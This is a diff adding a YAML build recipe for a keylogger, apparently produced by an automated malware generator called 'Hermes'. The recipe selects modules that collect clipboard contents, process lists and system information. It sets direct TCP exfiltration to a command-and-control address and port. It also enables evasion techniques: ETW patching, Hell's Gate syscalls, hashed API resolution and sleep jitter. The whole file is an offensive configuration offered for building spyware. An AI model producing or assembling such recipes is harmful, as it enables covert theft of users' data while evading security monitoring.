@@ -1,0 +1,21 @@
+name: keylogger_cs_proven_v1
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info_api
+- collectors/processes
+- collectors/clipboard
+exfil: exfil/tcp_direct
+arch: arch/sequential
+resources: true
+api_resolve: api_resolve/api_hash_fnv1a
+evasion:
+- evasion/etw_patch
+- evasion/hells_gate
+- evasion/sleep_jitter
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
